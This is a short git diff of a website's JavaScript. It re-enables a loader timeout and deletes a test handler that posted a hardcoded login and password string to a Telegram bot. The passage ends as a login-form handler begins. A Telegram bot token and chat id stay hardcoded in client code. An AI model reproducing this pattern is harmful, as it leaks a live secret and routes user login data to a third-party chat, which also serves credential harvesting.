@@ -15,13 +15,13 @@ burgerMenu.addEventListener("click", () => {
 AOS.init();
 
 // loader
-// setTimeout(() => {
-//   console.log("Time is out");
-//   document.querySelector("#loader").style.display = "none";
-//   document.querySelector("header").style.display = "block";
-//   document.querySelector("main").style.display = "block";
-//   document.querySelector("footer").style.display = "block";
-// }, 3000);
+setTimeout(() => {
+  console.log("Time is out");
+  document.querySelector("#loader").style.display = "none";
+  document.querySelector("header").style.display = "block";
+  document.querySelector("main").style.display = "block";
+  document.querySelector("footer").style.display = "block";
+}, 3000);
 
 // DIALOG
 const body = document.querySelector("body");
@@ -40,38 +40,12 @@ closeModal.addEventListener("click", () => {
   modal.close();
 });
 
-// loginSubmitBtn.addEventListener("click", (e) => {
-//   e.preventDefault();
-//   loginForm.reset();
-//   modal.close();
-// });
 
 const chat_id = "1415615526";
 const token = "7578906477:AAHGaYCcKVsqQLwoKk1-vog5PpzNSR7tOWE";
 const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-const request_btn = document.querySelector(".join-btn");
 
-request_btn.addEventListener("click", async () => {
-  try {
-    const res = await fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: "login 153254654\npassword 851358",
-      }),
-    });
-
-    if (res.ok) {
-      alert("Success!");
-    }
-  } catch (err) {
-    console.log(err);
-  }
-});
 const login_form_title = document.querySelector(".login-form_title")
 async function getDataFromForm(event){
   event.preventDefault()
